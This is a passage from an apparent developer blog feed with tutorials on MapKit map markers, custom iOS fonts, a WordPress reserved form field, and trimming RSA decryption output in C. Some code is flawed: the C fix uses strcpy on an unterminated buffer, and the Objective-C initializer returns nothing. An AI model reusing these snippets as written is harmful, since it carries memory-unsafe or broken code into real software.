(<span class="keyword">nonatomic</span>, <span class="keyword">assign</span>) <span class="type">double</span> latitude;</span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">assign</span>) <span class="type">double</span> longitude;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">MyPlace</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@synthesize</span> placeName = _placeName;</span><br><span class="line"><span class="keyword">@synthesize</span> latitude = _latitude;</span><br><span class="line"><span class="keyword">@synthesize</span> longitude = _longitude;</span><br><span class="line"></span><br><span class="line">- (<span class="type">id</span>)initWithJSON:(<span class="type">id</span>)json</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">self</span>.placeName = [json valueForKey:<span class="string">@&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">self</span>.latitude = [[json valueForKey:<span class="string">@&quot;lat&quot;</span>] doubleValue];</span><br><span class="line">    <span class="keyword">self</span>.longitude = [[json valueForKey:<span class="string">@&quot;lng&quot;</span>] doubleValue];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - MKAnnotation</span></span><br><span class="line"><span class="comment">// this will plot the marker to a correct place on map</span></span><br><span class="line">- (<span class="built_in">CLLocationCoordinate2D</span>)coordinate</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CLLocationCoordinate2DMake</span>(<span class="keyword">self</span>.latitude, <span class="keyword">self</span>.longitude);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)setCoordinate:(<span class="built_in">CLLocationCoordinate2D</span>)coordinate</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">self</span>.latitude = coordinate.latitude;</span><br><span class="line">    <span class="keyword">self</span>.longitude = coordinate.longitude;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this will be shown as marker title</span></span><br><span class="line">- (<span class="built_in">NSString</span> *)title</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>.placeName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this will be shown as marker subtitle</span></span><br><span class="line">- (<span class="built_in">NSString</span> *)subtitle</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">NSString</span> stringWithFormat:<span class="string">@&quot;Lat: %.9f, Lng: %.9f&quot;</span>, <span class="keyword">self</span>.latitude, <span class="keyword">self</span>.longitude];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><h3 id="Add-markers-center-the-region"><a href="#Add-markers-center-the-region" class="headerlink" title="Add markers, center the region"></a>Add markers, center the region</h3><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)loadLocation</span><br><span class="line">&#123;</span><br><span class="line">    MyPlace *place1 = [[MyPlace alloc] initWithJSON:[<span class="built_in">NSDictionary</span> dictionaryWithObjectsAndKeys:</span><br><span class="line">                            <span class="string">@&quot;The place 1&quot;</span>, <span class="string">@&quot;name&quot;</span>,</span><br><span class="line">                            <span class="string">@&quot;3.12345&quot;</span>, <span class="string">@&quot;lat&quot;</span>,</span><br><span class="line">                            <span class="string">@&quot;101.43219&quot;</span>, <span class="string">@&quot;lng&quot;</span>,</span><br><span class="line">                            <span class="literal">nil</span>]];</span><br><span class="line">    MyPlace *place2 = [[MyPlace alloc] initWithJSON:[<span class="built_in">NSDictionary</span> dictionaryWithObjectsAndKeys:</span><br><span class="line">                            <span class="string">@&quot;The place 2&quot;</span>, <span class="string">@&quot;name&quot;</span>,</span><br><span class="line">                            <span class="string">@&quot;4.98721&quot;</span>, <span class="string">@&quot;lat&quot;</span>,</span><br><span class="line">                            <span class="string">@&quot;101.82665&quot;</span>, <span class="string">@&quot;lng&quot;</span>,</span><br><span class="line">                            <span class="literal">nil</span>]];</span><br><span class="line">    MyPlace *place3 = [[MyPlace alloc] initWithJSON:[<span class="built_in">NSDictionary</span> dictionaryWithObjectsAndKeys:</span><br><span class="line">                            <span class="string">@&quot;The place 1&quot;</span>, <span class="string">@&quot;name&quot;</span>,</span><br><span class="line">                            <span class="string">@&quot;5.88621&quot;</span>, <span class="string">@&quot;lat&quot;</span>,</span><br><span class="line">                            <span class="string">@&quot;100.99811&quot;</span>, <span class="string">@&quot;lng&quot;</span>,</span><br><span class="line">                            <span class="literal">nil</span>]];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">NSArray</span> *places = @[place1, place2, place3];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// centered the region</span></span><br><span class="line">    <span class="built_in">MKCoordinateRegion</span> region = [<span class="keyword">self</span> regionForAnnotations:places];</span><br><span class="line">    [<span class="keyword">self</span>.mapView setRegion:region animated:<span class="literal">YES</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> if doesn&#x27;t call this method, no marker will be shown</span></span><br><span class="line">    [<span class="keyword">self</span>.mapView addAnnotations:places];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - MKMapViewDelegate</span></span><br><span class="line"><span class="comment">// this method will only be called if addAnnotation method is call</span></span><br><span class="line">- (<span class="built_in">MKAnnotationView</span> *)mapView:(<span class="built_in">MKMapView</span> *)mapView viewForAnnotation:(<span class="type">id</span>&lt;<span class="built_in">MKAnnotation</span>&gt;)annotation</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// check wether is refer to the class you created just now</span></span><br><span class="line">    <span class="keyword">if</span> ([annotation isKindOfClass:[MyPlace <span class="keyword">class</span>]]) &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">NSString</span> *identifier = <span class="string">@&quot;MyLocation&quot;</span>;</span><br><span class="line">        <span class="comment">// just like UITableViewCell, also using dequeue reusable</span></span><br><span class="line">        <span class="built_in">MKPinAnnotationView</span> *annotationView = (<span class="built_in">MKPinAnnotationView</span> *)[<span class="keyword">self</span>.mapView dequeueReusableAnnotationViewWithIdentifier:identifier];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">UIButton</span> *rightButton;</span><br><span class="line">        <span class="keyword">if</span> (annotationView == <span class="literal">nil</span>) &#123;</span><br><span class="line">            annotationView = [[<span class="built_in">MKPinAnnotationView</span> alloc] initWithAnnotation:annotation reuseIdentifier:identifier];</span><br><span class="line">            <span class="comment">// make configuration</span></span><br><span class="line">            annotationView.enabled = <span class="literal">YES</span>;</span><br><span class="line">            annotationView.canShowCallout = <span class="literal">YES</span>;</span><br><span class="line">            annotationView.animatesDrop = <span class="literal">NO</span>;</span><br><span class="line">            annotationView.pinColor = <span class="built_in">MKPinAnnotationColorGreen</span>;</span><br><span class="line">            <span class="comment">// provide custom image as marker if you want to</span></span><br><span class="line">            annotationView.image = [<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;IconMarker&quot;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// optional: make it draggable</span></span><br><span class="line">            annotationView.animatesDrop = <span class="literal">YES</span>;</span><br><span class="line">            annotationView.draggable = <span class="literal">YES</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// optional: you can add a button</span></span><br><span class="line">            rightButton = [<span class="built_in">UIButton</span> buttonWithType:<span class="built_in">UIButtonTypeDetailDisclosure</span>];</span><br><span class="line">            [rightButton addTarget:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(placeTouched:) forControlEvents:<span class="built_in">UIControlEventTouchUpInside</span>];</span><br><span class="line">            annotationView.rightCalloutAccessoryView = rightButton;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            annotationView.annotation = annotation;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// add a tag with a specific offset</span></span><br><span class="line">        <span class="comment">// remember to put this outside, the annotation will be reuse everytime,</span></span><br><span class="line">        <span class="comment">// if this is only set on annotation creation, you may have chances to get the wrong info</span></span><br><span class="line">        rightButton.tag = <span class="number">4000</span> + ((MyPlace *)annotation).theId;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> annotationView;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dragged annotation</span></span><br><span class="line">- (<span class="type">void</span>)mapView:(<span class="built_in">MKMapView</span> *)mapView annotationView:(<span class="built_in">MKAnnotationView</span> *)annotationView didChangeDragState:(<span class="built_in">MKAnnotationViewDragState</span>)newState fromOldState:(<span class="built_in">MKAnnotationViewDragState</span>)oldState</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (newState == <span class="built_in">MKAnnotationViewDragStateEnding</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CLLocationCoordinate2D</span> droppedAt = annotationView.annotation.coordinate;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Pin dropped at %f,%f&quot;</span>, droppedAt.latitude, droppedAt.longitude);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="built_in">MKCoordinateRegion</span>)regionForAnnotations:(<span class="built_in">NSArray</span> *)annotations</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">MKCoordinateRegion</span> region;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ([annotations count] == <span class="number">0</span>) &#123;</span><br><span class="line">        region = <span class="built_in">MKCoordinateRegionMakeWithDistance</span>(<span class="keyword">self</span>.mapView.userLocation.coordinate, <span class="number">1000</span>, <span class="number">1000</span>);</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ([annotations count] == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">id</span> &lt;<span class="built_in">MKAnnotation</span>&gt; annotation = [annotations lastObject];</span><br><span class="line">        region = <span class="built_in">MKCoordinateRegionMakeWithDistance</span>(annotation.coordinate, <span class="number">1000</span>, <span class="number">1000</span>);</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">CLLocationCoordinate2D</span> topLeftCoord;</span><br><span class="line">        topLeftCoord.latitude = <span class="number">-90</span>;</span><br><span class="line">        topLeftCoord.longitude = <span class="number">180</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">CLLocationCoordinate2D</span> bottomRightCoord;</span><br><span class="line">        bottomRightCoord.latitude = <span class="number">90</span>;</span><br><span class="line">        bottomRightCoord.longitude = <span class="number">-180</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">id</span> &lt;<span class="built_in">MKAnnotation</span>&gt; annotation <span class="keyword">in</span> annotations)</span><br><span class="line">        &#123;</span><br><span class="line">            topLeftCoord.latitude = fmax(topLeftCoord.latitude, annotation.coordinate.latitude);</span><br><span class="line">            topLeftCoord.longitude = fmin(topLeftCoord.longitude, annotation.coordinate.longitude);</span><br><span class="line">            bottomRightCoord.latitude = fmin(bottomRightCoord.latitude, annotation.coordinate.latitude);</span><br><span class="line">            bottomRightCoord.longitude = fmax(bottomRightCoord.longitude, annotation.coordinate.longitude);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> <span class="type">double</span> extraSpace = <span class="number">1.1</span>;</span><br><span class="line">        region.center.latitude = topLeftCoord.latitude - (topLeftCoord.latitude - bottomRightCoord.latitude) / <span class="number">2.0</span>;</span><br><span class="line">        region.center.longitude = topLeftCoord.longitude - (topLeftCoord.longitude - bottomRightCoord.longitude) / <span class="number">2.0</span>;</span><br><span class="line">        region.span.latitudeDelta = fabs(topLeftCoord.latitude - bottomRightCoord.latitude) * extraSpace;</span><br><span class="line">        region.span.longitudeDelta = fabs(topLeftCoord.longitude - bottomRightCoord.longitude) * extraSpace;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [<span class="keyword">self</span>.mapView regionThatFits:region];</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>So just call the <code>loadLocation</code> then the markers will shown.</p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/9442830/in-which-case-that-mapviewviewforannotation-will-be-called/9442902#9442902">In which case that mapView:viewForAnnotation: will be called?</a></em></li><li><em><a href="http://stackoverflow.com/questions/10733564/drag-an-annotation-pin-on-a-mapview/10734653#10734653">Drag an annotation pin on a mapview</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Here I want to discuss about using &lt;strong&gt;map&lt;/strong&gt; in iOS application&lt;/p&gt;
&lt;h3 id=&quot;First-import-MapKit&quot;&gt;&lt;a</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Use custom font in iOS application</title>
    <link href="http://jslim.net/blog/2013/10/08/use-custom-font-in-ios-application/"/>
    <id>http://jslim.net/blog/2013/10/08/use-custom-font-in-ios-application/</id>
    <published>2013-10-08T03:04:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>There are few steps to add custom font in your Xcode project.</p><h2 id="Step-1-Add-UIAppFonts-to-your-Info-plist"><a href="#Step-1-Add-UIAppFonts-to-your-Info-plist" class="headerlink" title="Step 1: Add UIAppFonts to your Info.plist"></a>Step 1: Add <code>UIAppFonts</code> to your Info.plist</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>UIAppFonts<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-BLACK.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-BLACKIT.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-BOLD.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-BOLDIT.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-EXTRALIGHT.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-EXTRALIGHTIT.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-IT.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-LIGHT.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-LIGHTIT.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-REGULAR.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-SEMIBOLD.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>CUSTOMFONT-SEMIBOLDIT.TTF<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure><p>You must add this before you can use the font</p><h2 id="Step-2-Drag-your-font-into-Resources-folder"><a href="#Step-2-Drag-your-font-into-Resources-folder" class="headerlink" title="Step 2: Drag your font into Resources folder"></a>Step 2: Drag your font into <code>Resources</code> folder</h2><ul><li>Make sure you check <strong>Copy items into destination group’s folder (if needed)</strong></li><li>Select <strong>Create groups for any added folders</strong></li><li>Check <strong>Add to targets</strong> for your project</li></ul><h2 id="Step-3-Verify-is-your-font-now-in-Bundle-resources"><a href="#Step-3-Verify-is-your-font-now-in-Bundle-resources" class="headerlink" title="Step 3: Verify is your font now in Bundle resources"></a>Step 3: Verify is your font now in Bundle resources</h2><p>Go to <strong>Project</strong> -&gt; <strong>Targets</strong> and select your project. In <strong>Build Phases</strong> tab, look for <strong>Copy Bundle Resources</strong> and make sure the font is there.</p><p><img src="/images/posts/2013-10-08-use-custom-font-in-ios-application/font-in-resource-bundle.png" alt="Resource Bundle"></p><h2 id="Step-4-Print-out-all-available-font"><a href="#Step-4-Print-out-all-available-font" class="headerlink" title="Step 4: Print out all available font"></a>Step 4: Print out all available font</h2><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">NSString</span> *familyName <span class="keyword">in</span> [<span class="built_in">UIFont</span> familyNames]) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">NSString</span> *fontName <span class="keyword">in</span> [<span class="built_in">UIFont</span> fontNamesForFamilyName:familyName]) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Font: %@&quot;</span>, fontName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And make sure your font is there</p><h2 id="Step-5-Start-using-your-font"><a href="#Step-5-Start-using-your-font" class="headerlink" title="Step 5: Start using your font"></a>Step 5: Start using your font</h2><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myLabel.font = [<span class="built_in">UIFont</span> fontWithName:<span class="string">@&quot;CustomFont-Black&quot;</span> size:<span class="number">50</span>];</span><br></pre></td></tr></table></figure><p><strong>NOTE: If it doesn’t work, repeat <code>Step 2</code> again. Some time it may not work</strong></p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/15984937/adding-custom-fonts-to-ios-app-finding-their-real-names/15985120#15985120">Adding custom fonts to iOS app finding their real names</a></em></li><li><em><a href="http://stackoverflow.com/questions/13029660/use-custom-fonts-in-iphone-app/13029818#13029818">Use custom fonts in iPhone App [duplicate]</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;There are few steps to add custom font in your Xcode project.&lt;/p&gt;
&lt;h2 id=&quot;Step-1-Add-UIAppFonts-to-your-Info-plist&quot;&gt;&lt;a</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Wordpress form submission get 404</title>
    <link href="http://jslim.net/blog/2013/10/04/wordpress-form-submission-get-404/"/>
    <id>http://jslim.net/blog/2013/10/04/wordpress-form-submission-get-404/</id>
    <published>2013-10-04T07:59:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Have you ever face a problem, when there is <strong>GET</strong> request, it shows the form properly. However when there is <strong>POST</strong> request, there are 2 situations:</p><ol><li>The form has errors, then show error messages properly.</li><li>There is no error, it throws <strong>404</strong> <em>(page not found)</em>.</li></ol><p>I’ve struggling for few hours, and this is weird.</p><p>Example form <strong>(not working)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Finally I found out the reason behind, because of the <code>name=&quot;name&quot;</code>. The <code>name</code> is reserve word in WordPress.</p><p>So just change it to others</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_name&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Then it works well.</p><p><strong>NOTE: Beside <code>name</code>, actually there are others reserve words like <code>day</code>, <code>month</code> and <code>year</code></strong></p><p>Hope this helps :)</p><p>Reference: <a href="http://wordpress.org/support/topic/404-pops-after-custom-form-submission-by-post#post-1291358">404 pops after custom form submission by POST</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Have you ever face a problem, when there is &lt;strong&gt;GET&lt;/strong&gt; request, it shows the form properly. However when there is</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="wordpress" scheme="http://jslim.net/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>Remove unwanted/dummy character in C language</title>
    <link href="http://jslim.net/blog/2013/09/25/remove-unwanted-slash-dummy-character-in-c-language/"/>
    <id>http://jslim.net/blog/2013/09/25/remove-unwanted-slash-dummy-character-in-c-language/</id>
    <published>2013-09-25T11:22:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve encounter this issue in RSA decryption (<code>RSA_private_decrypt</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> result_length = RSA_private_decrypt(<span class="number">64</span>, (<span class="type">unsigned</span> <span class="type">char</span>*)crypt_chunk, (<span class="type">unsigned</span> <span class="type">char</span> *)result_chunk, rsa_privateKey, RSA_PKCS1_PADDING);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Result chunk: %s\nChunk length: %d\n&quot;</span>, result_chunk, result_length);</span><br></pre></td></tr></table></figure><p>Output</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Result</span> chunk: <span class="number">33</span>-<span class="number">9998</span>-<span class="number">123</span>-<span class="number">123408101123451250</span>-PARADM01_00023054-CY00\<span class="number">240</span>Z</span><br><span class="line"><span class="attribute">Chunk</span> length: <span class="number">53</span></span><br></pre></td></tr></table></figure><p>But what I want is <code>33-9998-123-123408101123451250-PARADM01_00023054-CY00</code></p><p>I googled for some time still can’t get the result. By try-and-error method, I solved this by adding the following code</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> tmp_result[result_length + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(tmp_result, result_chunk);</span><br><span class="line">tmp_result[result_length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New chunk: %s\n&quot;</span>, tmp_result);</span><br></pre></td></tr></table></figure><p>Output</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">New</span> chunk: <span class="number">33</span>-<span class="number">9998</span>-<span class="number">123</span>-<span class="number">123408101123451250</span>-PARADM01_00023054-CY00</span><br></pre></td></tr></table></figure><ol><li>Declaring a new variable with additional 1 more character of the original result</li><li>Copy the original result to the new variable</li><li>Inject a <code>null</code> character to the end of the new variable</li></ol><p>Hope this helps. :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve encounter this issue in RSA decryption (&lt;code&gt;RSA_private_decrypt&lt;/code&gt;)&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
        
      
    
    
    
    
    <category term="c language" scheme="http://jslim.net/tags/c-language/"/>
    
  </entry>
  
  <entry>
    <title>How iPhone communicate with server in PHP</title>
    <link href="http://jslim.net/blog/2013/09/22/how-iphone-communicate-with-server-in-php/"/>
    <id>http://jslim.net/blog/2013/09/22/how-iphone-communicate-with-server-in-php/</id>
    <published>2013-09-22T07:16:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I have few friends as me about this.</p><p>– <strong>How iOS can retrieve/update from/to MySQL/MSSQL database?</strong> –</p><p>There are 2 parts:- <strong>Server side</strong> and <strong>Client side</strong></p><p>In this example the <strong>Server side</strong> will refer to <code>Apache</code>, <code>MySQL</code> and <code>PHP</code>. While <strong>Client side</strong> is <code>iPhone App</code> in Objective-C.</p><h2 id="Server-side"><a href="#Server-side" class="headerlink" title="Server side"></a>Server side</h2><p>Assume that your <strong>Base URL</strong> is <code>http://api.yoursite.com</code></p><h4 id="Retrieve-a-list-of-users"><a href="#Retrieve-a-list-of-users" class="headerlink" title="Retrieve a list of users"></a>Retrieve a list of users</h4><p><code>GET http://api.yoursite.com/users</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 